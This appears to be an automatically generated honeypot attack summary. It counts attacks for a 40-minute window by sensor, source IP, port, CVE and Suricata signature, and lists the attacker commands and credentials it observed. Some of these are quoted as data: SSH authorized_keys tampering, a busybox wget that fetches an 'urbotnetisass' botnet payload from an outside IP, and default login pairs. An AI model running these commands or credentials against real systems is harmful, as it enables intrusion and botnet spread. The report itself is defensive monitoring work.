Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-04T05:01:38Z
**Timeframe:** 2025-10-04T04:20:01Z to 2025-10-04T05:00:01Z
**Files Used:**
- agg_log_20251004T042001Z.json
- agg_log_20251004T044001Z.json
- agg_log_20251004T050001Z.json

**Executive Summary**

This report summarizes 13,922 attacks recorded across three honeypot log files. The majority of attacks were captured by the Cowrie and Suricata honeypots. A significant portion of the malicious traffic originated from the IP address 113.187.69.246, which was primarily engaged in exploiting the SMB protocol on TCP port 445. The most common commands attempted by attackers involved reconnaissance and attempts to modify SSH authorized_keys. Several CVEs were detected, with CVE-2002-0013 and CVE-2002-0012 being the most frequent.

**Detailed Analysis**

***Attacks by Honeypot***

- Cowrie: 6176
- Suricata: 3018
- Ciscoasa: 1821
- Honeytrap: 1505
- Mailoney: 857
- Sentrypeer: 209
- Dionaea: 144
- ConPot: 48
- Adbhoney: 23
- H0neytr4p: 35
- Redishoneypot: 24
- Tanner: 27
- Miniprint: 9
- Dicompot: 8
- Honeyaml: 11
- Ipphoney: 3
- ElasticPot: 4

***Top Attacking IPs***

- 113.187.69.246: 1535
- 176.65.141.117: 820
- 196.251.80.29: 446
- 180.252.94.109: 308
- 209.38.228.14: 308
- 104.168.56.59: 244
- 173.249.45.217: 320
- 36.139.251.213: 234
- 189.124.17.190: 238
- 103.253.21.190: 227

***Top Targeted Ports/Protocols***

- TCP/445: 1535
- 22: 920
- 25: 853
- 5060: 209
- 3306: 61
- 443: 35
- 445: 40
- 80: 29
- 23: 23
- 6379: 24
- 19000: 26
- UDP/161: 30

***Most Common CVEs***

- CVE-2002-0013 CVE-2002-0012: 20
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 13
- CVE-2021-3449 CVE-2021-3449: 4
- CVE-2019-11500 CVE-2019-11500: 4
- CVE-2023-26801 CVE-2023-26801: 1
- CVE-2018-11776: 1

***Commands Attempted by Attackers***

- cd ~; chattr -ia .ssh; lockr -ia .ssh: 36
- lockr -ia .ssh: 36
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...": 36
- uname -a: 29
- whoami: 28
- lscpu | grep Model: 29
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}': 29
- cat /proc/cpuinfo | grep name | wc -l: 27
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}': 27
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}': 27
- ls -lh $(which ls): 27
- which ls: 27
- crontab -l: 27
- w: 27
- uname -m: 27
- cat /proc/cpuinfo | grep model | grep name | wc -l: 28
- top: 28
- uname: 28
- Enter new UNIX password: : 20
- Enter new UNIX password:": 20

***Signatures Triggered***

- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1533
- 2024766: 1533
- ET DROP Dshield Block Listed Source group 1: 474
- 2402000: 474
- ET SCAN NMAP -sS window 1024: 172
- 2009582: 172
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 80
- 2023753: 80
- ET INFO Reserved Internal IP Traffic: 54
- 2002752: 54

***Users / Login Attempts***

- a2billinguser/: 59
- 345gs5662d34/345gs5662d34: 33
- root/nPSpP4PBW0: 17
- superadmin/admin123: 9
- test/zhbjETuyMffoL8F: 8
- root/LeitboGi0ro: 9
- root/3245gs5662d34: 9
- root/2glehe5t24th1issZs: 8
- root/MSN55msn!!: 6
- root/Aa112211.: 7

***Files Uploaded/Downloaded***

- arm.urbotnetisass;: 2
- arm.urbotnetisass: 2
- arm5.urbotnetisass;: 2
- arm5.urbotnetisass: 2
- arm6.urbotnetisass;: 2
- arm6.urbotnetisass: 2
- arm7.urbotnetisass;: 2
- arm7.urbotnetisass: 2
- x86_32.urbotnetisass;: 2
- x86_32.urbotnetisass: 2
- mips.urbotnetisass;: 2
- mips.urbotnetisass: 2
- mipsel.urbotnetisass;: 2
- mipsel.urbotnetisass: 2

***HTTP User-Agents***

- No HTTP user agents were recorded in the logs.

***SSH Clients and Servers***

- No SSH clients or servers were recorded in the logs.

***Top Attacker AS Organizations***

- No attacker AS organizations were recorded in the logs.

**Key Observations and Anomalies**

- A high volume of traffic from IP 113.187.69.246 was observed, targeting TCP port 445 and triggering the Suricata signature for the "DoublePulsar Backdoor". This indicates a likely compromise attempt related to the EternalBlue exploit.
- The command `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` suggests an attempt to download and execute a malicious payload on Android-based systems.
- A recurring pattern of commands aimed at manipulating the `.ssh/authorized_keys` file was observed, indicating a common tactic to gain persistent access to compromised systems.
- The most frequently attempted credentials include generic usernames like 'a2billinguser' and 'superadmin', as well as default credentials.
